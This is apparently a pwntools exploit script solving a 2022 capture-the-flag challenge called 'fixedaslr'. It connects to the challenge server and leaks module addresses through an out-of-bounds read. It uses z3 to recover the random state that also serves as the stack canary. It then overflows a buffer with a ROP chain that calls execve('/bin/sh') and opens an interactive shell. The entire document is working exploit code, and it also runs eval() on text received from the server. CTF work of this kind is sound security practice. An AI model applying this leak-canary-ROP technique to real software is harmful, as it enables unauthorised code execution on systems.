from pwn import *

# p = process('./loader')
p = remote('fixedaslr.2022.ctfcompetition.com', 1337)

def get_addr(idx):
	p.recv()
	p.sendline(b'3')
	p.recv()
	p.sendline(str(idx).encode())
	p.recvuntil(b': ')

	return int(p.recvline()[:-1])

def get_index(start):
    return ((start - game_score_board_addr) & 0xffffffffffffffff) // 8

main_o = get_addr(512) - 0x60 - 0x2000
game_score_board_addr = main_o + 0x2000

idx = get_index(main_o + 0x8)
game_o = get_addr(idx) - 0x1111

idx = get_index(main_o + 0x38)
guard_o = get_addr(idx) - 0x1000

idx = get_index(game_o + 0x8)
basic_o = get_addr(idx) - 0x119c

idx = get_index(guard_o + 0x8)
syscalls_o = get_addr(idx) - 0x1064

idx = get_index(game_o + 0x2000)
res_o = get_addr(idx) - 0x1000

log.info('main.o        : ' + hex(main_o))
log.info('syscalls.o    : ' + hex(syscalls_o))
log.info('guard.o       : ' + hex(guard_o))
log.info('basic.o       : ' + hex(basic_o))
log.info('game.o        : ' + hex(game_o))
log.info('res.o         : ' + hex(res_o))

known_states = [main_o >> 28, syscalls_o >> 28, guard_o >> 28, basic_o >> 28, game_o >> 28, res_o >> 28]

from z3 import *

s = Solver()
log.info(f'Known states: {known_states}')

rand_state = BitVec("x", 64)

def rand_extract_bit(a):
	global rand_state
	return (rand_state >> a) & 1

def rand_get_bit():
	global rand_state
	x = (
		rand_extract_bit(0x3F)
		^ rand_extract_bit(0x3D)
		^ rand_extract_bit(0x3C)
		^ rand_extract_bit(0x3A)
		^ 1
	)
	rand_state = ((rand_state << 1) % (2**64)) | x
	return x

def rand(n):
	x = 0
	for i in range(n):
		y = rand_get_bit()
		x = (x << 1) | y
	return x

for known_state in known_states:
	s.add(rand(12) == known_state)

recovered_canary = 0
if s.check() == sat:
	model = s.model()
	recovered_canary = model[BitVec("x", 64)].as_long()

log.info('Recovered canary: ' + hex(recovered_canary))

rand_state = recovered_canary
debug_o = 0
for i in range(7):
    debug_o = rand(12)

debug_o = debug_o << 28
log.info('debug.o       : ' + hex(debug_o))

p.recv()
p.sendline(b'1')

for i in range(12):
    p.recvuntil(b'How much is ')

    equation = p.recvline()[:-3]
    res = eval(equation)

    p.sendline(str(res).encode())

p.sendline(b'0')
p.recv()
p.sendline(b'1000')

pop_rsi = debug_o + 0x1004
pop_rdx = debug_o + 0x1010
pop_rax = debug_o + 0x1007
syscall = syscalls_o + 0x1002

payload = b'/bin/sh'
payload = payload.ljust(0x28, b'\x00')
payload += p64(recovered_canary)
payload += b'a'*8
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)

p.recv()
p.sendline(payload)

p.recvrepeat(0.5)

p.interactive()
